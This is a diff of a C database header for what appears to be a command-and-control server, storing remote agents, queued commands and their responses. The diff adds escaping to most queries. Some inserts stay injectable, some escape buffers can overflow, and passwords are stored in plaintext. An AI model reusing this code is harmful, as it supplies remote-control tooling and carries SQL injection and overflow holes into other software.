@@ -1,7 +1,6 @@
 #ifndef database
 #define database
 
-
 #include <mysql/mysql.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -11,14 +10,6 @@
 
 #define BUFFER_SIZE 4096
 #define MAX_INFO 999999999
-
-// change so that it uses config file
-/*
-char dbserver[256] = "localhost";
-char user[32] = "core";
-char pass[32] = "core";
-char db[32] = "c2_database";
-*/
 
 struct db_agents {
     char agent_id[65];
@@ -41,21 +32,11 @@ struct db_logs {
     char message[BUFFER_SIZE];
 };
 
-
-
-
 MYSQL *con;
 int db_conn(const char *dbserver, const char *user, const char *pass, const char *db) {
     con = mysql_init(NULL);
-    if (con == NULL) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-        return -1;
-    }
-    // connect to dabatabase
-    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-        return -1;
-    }
+    if (con == NULL) return -1;
+    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) return -1;
     return 0;
 }
 
@@ -63,265 +44,170 @@ void db_close() {
     mysql_close(con);
 }
 
-// agent and operator
 int check_agent_id(char *agent_id) {
+    char esc[130];
+    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
     char query[1024];
-    snprintf(query, sizeof(query), "SELECT * FROM Agents WHERE agent_id = '%s'", agent_id);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-        mysql_close(con);
-    }
+    snprintf(query, sizeof(query), "SELECT * FROM Agents WHERE agent_id = '%s'", esc);
+    if (mysql_query(con, query)) return 0;
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) { 
-        fprintf(stderr, "%s\n", mysql_error(con));
-        mysql_close(con);
-        return 0;
-    }
+    if (result == NULL) return 0;
     int num_rows = mysql_num_rows(result);
     mysql_free_result(result);
-
-    return (num_rows > 0); // 1 if agent exists, 0 if not
+    return (num_rows > 0);
 }
 
-// agent
 char *get_task(int task_id) {
     char query[1024];
     snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);
-
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "MySQL query failed: %s\n", mysql_error(con));
-        return NULL;
-    }
+    if (mysql_query(con, query)) return NULL;
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) {
-        fprintf(stderr, "MySQL store result failed: %s\n", mysql_error(con));
-        return NULL;
-    }
+    if (result == NULL) return NULL;
     MYSQL_ROW row = mysql_fetch_row(result);
     char *cmd = NULL;
-    if (row && row[0]) {
-        cmd = strdup(row[0]);
-    }
+    if (row && row[0]) cmd = strdup(row[0]);
     mysql_free_result(result);
-
     return cmd;
 }
 
-
-// agent
-void store_task_response(char *response, int task_id) { 
-    char *query = malloc(sizeof(response) + 1024 );
-    snprintf(query, sizeof(response) + 1024, "UPDATE Tasks SET status = TRUE, response = '%s' WHERE task_id = %d;", response, task_id);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "MySQL query failed: %s\n", mysql_error(con));
-        return;
-    }
-
+void store_task_response(char *response, int task_id) {
+    char esc[BUFFER_SIZE * 2];
+    mysql_real_escape_string(con, esc, response, strlen(response));
+    char *query = malloc(strlen(esc) + 256);
+    snprintf(query, strlen(esc) + 256, "UPDATE Tasks SET status = TRUE, response = '%s' WHERE task_id = %d;", esc, task_id);
+    mysql_query(con, query);
     free(query);
 }
 
-
-
-// agent
 int check_tasks_queue(char *agent_id) {
+    char esc[130];
+    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
     char query[1024];
-    snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE agent_id = '%s';", agent_id);
-
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "Query failed: %s\n", mysql_error(con));
-        return -1;
-    }
-
+    snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE agent_id = '%s';", esc);
+    if (mysql_query(con, query)) return -1;
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) {
-        fprintf(stderr, "Store result failed: %s\n", mysql_error(con));
-        return -1;
-    }
-
+    if (result == NULL) return -1;
     MYSQL_ROW row;
     while ((row = mysql_fetch_row(result))) {
-        // row[0] = task_id, row[1] = status
         if (row[1] != NULL && atoi(row[1]) == 0) {
             int task_id = atoi(row[0]);
             mysql_free_result(result);
             return task_id;
         }
     }
-
     mysql_free_result(result);
-    return -1; 
+    return -1;
 }
 
-// agent
 void AgentsTable(struct db_agents args) {
-    char *query = malloc(256+sizeof(struct db_agents));
-    snprintf(query,  256 + sizeof(struct db_agents), "INSERT INTO Agents (agent_id, os, ip, mac, arch, hostname) VALUES ('%s', '%s', '%s', '%s', '%s', '%s');", args.agent_id, args.os, args.ip , args.mac, args.arch, args.hostname);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
-    free(query);
+    char query[2048];
+    snprintf(query, sizeof(query), "INSERT INTO Agents (agent_id, os, ip, mac, arch, hostname) VALUES ('%s', '%s', '%s', '%s', '%s', '%s');",
+             args.agent_id, args.os, args.ip, args.mac, args.arch, args.hostname);
+    mysql_query(con, query);
 }
-// agent
+
 void update_last_seen(char *agent_id) {
+    char esc[130];
+    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
     char query[1024];
-    snprintf(query, sizeof(query), "UPDATE Agents SET last_seen = CURRENT_TIMESTAMP() WHERE agent_id = '%s';", agent_id);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
+    snprintf(query, sizeof(query), "UPDATE Agents SET last_seen = CURRENT_TIMESTAMP() WHERE agent_id = '%s';", esc);
+    mysql_query(con, query);
 }
 
-// operator
 void TasksTable(struct db_tasks args) {
-    char *query = malloc(256 + sizeof(struct db_tasks));
-    snprintf(query,256 + sizeof(struct db_tasks), "INSERT INTO Tasks (agent_id, command, response) VALUES ('%s', '%s', '%s');", args.agent_id, args.command, args.response);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-        
-    }
-    free(query);
+    char query[4096];
+    snprintf(query, sizeof(query), "INSERT INTO Tasks (agent_id, command, response) VALUES ('%s', '%s', '%s');",
+             args.agent_id, args.command, args.response);
+    mysql_query(con, query);
 }
-
 
 void LogsTable(struct db_logs args) {
-    char *query= malloc(1024+sizeof(struct db_logs));
-    snprintf(query, 1024+sizeof(struct db_logs),"INSERT INTO Logs (agent_id, log_type, message) VALUES ('%s', '%s', '%s');", args.agent_id, args.log_type, args.message);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
-    free(query);
+    char query[4096];
+    snprintf(query, sizeof(query), "INSERT INTO Logs (agent_id, log_type, message) VALUES ('%s', '%s', '%s');",
+             args.agent_id, args.log_type, args.message);
+    mysql_query(con, query);
 }
 
-
-// used to view agent and tasks 
 char *info_view(char *table) {
+    char esc[256];
+    mysql_real_escape_string(con, esc, table, strlen(table));
     char *query = malloc(1024);
-    snprintf(query, 1024, "SELECT * FROM %s;", table);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
-
-
+    snprintf(query, 1024, "SELECT * FROM %s;", esc);
+    if (mysql_query(con, query)) return NULL;
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) { 
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
-    //int num_rows = mysql_num_rows(result);
-    int num_fields = mysql_num_fields(result); // columns
-
+    if (result == NULL) return NULL;
+    int num_fields = mysql_num_fields(result);
     MYSQL_FIELD *fields = mysql_fetch_fields(result);
-
     cJSON *column_arrays[num_fields];
-    for (int i = 0; i < num_fields; i++)
-        column_arrays[i] = cJSON_CreateArray();
-
+    for (int i = 0; i < num_fields; i++) column_arrays[i] = cJSON_CreateArray();
     MYSQL_ROW row;
     while ((row = mysql_fetch_row(result))) {
         for (int i = 0; i < num_fields; i++) {
-            if (row[i])
-                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
-            else
-                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
+            if (row[i]) cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
+            else cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
         }
     }
-
-    // Create root object and attach columns
     cJSON *root = cJSON_CreateObject();
-    for (int i = 0; i < num_fields; i++)
-        cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
-
+    for (int i = 0; i < num_fields; i++) cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
     char *json_output = cJSON_Print(root);
-    if (json_output) {
-    } else {
-        fprintf(stderr, "Failed to print JSON\n");
-    }
-
-    cJSON_Delete(root); // Automatically frees column_arrays
+    cJSON_Delete(root);
     mysql_free_result(result);
     free(query);
-
     return json_output;
 }
 
-// operator
-int authenticate_operator(char *username, char*password) {
-    char *query = malloc(2048);
-    snprintf(query, 2048, "SELECT * FROM Operators WHERE username='%s' AND password='%s';", username, password);
-
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "MySQL query error: %s\n", mysql_error(con));
-        return -1;
-    }
-
+int authenticate_operator(char *username, char *password) {
+    char esc_user[128];
+    char esc_pass[128];
+    mysql_real_escape_string(con, esc_user, username, strlen(username));
+    mysql_real_escape_string(con, esc_pass, password, strlen(password));
+    char *query = malloc(1024);
+    snprintf(query, 1024, "SELECT * FROM Operators WHERE username='%s' AND password='%s';", esc_user, esc_pass);
+    if (mysql_query(con, query)) return -1;
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) { 
-        fprintf(stderr, "MySQL store result error: %s\n", mysql_error(con));
-        return -1;
-    }
-
+    if (result == NULL) return -1;
     int num_rows = mysql_num_rows(result);
     mysql_free_result(result);
-
-    if (num_rows > 0) {
-        return 0;  // authenticated
-    }
-
-    return -1;  // not authenticated
+    free(query);
+    return (num_rows > 0) ? 0 : -1;
 }
 
-// operator
 char *tasks_per_agent(char *agent_id) {
+    char esc[130];
+    mysql_real_escape_string(con, esc, agent_id, strlen(agent_id));
     char *query = malloc(1024);
-    snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE agent_id = '%s';", agent_id);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
+    snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE agent_id = '%s';", esc);
+    if (mysql_query(con, query)) return NULL;
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) { 
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
-    //int num_rows = mysql_num_rows(result);
-    int num_fields = mysql_num_fields(result); // columns
+    if (result == NULL) return NULL;
+    int num_fields = mysql_num_fields(result);
     MYSQL_FIELD *fields = mysql_fetch_fields(result);
-
     cJSON *column_arrays[num_fields];
-    for (int i = 0; i < num_fields; i++)
-        column_arrays[i] = cJSON_CreateArray();
-
+    for (int i = 0; i < num_fields; i++) column_arrays[i] = cJSON_CreateArray();
     MYSQL_ROW row;
     while ((row = mysql_fetch_row(result))) {
         for (int i = 0; i < num_fields; i++) {
-            if (row[i])
-                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
-            else
-                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
+            if (row[i]) cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
+            else cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
         }
     }
-
-    // Create root object and attach columns
     cJSON *root = cJSON_CreateObject();
-    for (int i = 0; i < num_fields; i++)
-        cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
-
+    for (int i = 0; i < num_fields; i++) cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
     char *json_output = cJSON_Print(root);
-    if (json_output) {
-    } else {
-        fprintf(stderr, "Failed to print JSON\n");
-    }
-
-    cJSON_Delete(root); // Automatically frees column_arrays
+    cJSON_Delete(root);
     mysql_free_result(result);
     free(query);
-
-    return json_output;   
+    return json_output;
 }
 
-// operator
 void new_tasks(char *agent_id, char *command) {
+    char esc_id[130];
+    char esc_cmd[1024];
+    mysql_real_escape_string(con, esc_id, agent_id, strlen(agent_id));
+    mysql_real_escape_string(con, esc_cmd, command, strlen(command));
     char *query = malloc(1024);
-    snprintf(query, 1024, "INSERT INTO Tasks (agent_id, command) VALUES ('%s', '%s');", agent_id, command);
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "%s\n", mysql_error(con));
-    }
+    snprintf(query, 1024, "INSERT INTO Tasks (agent_id, command) VALUES ('%s', '%s');", esc_id, esc_cmd);
+    mysql_query(con, query);
     free(query);
 }
 
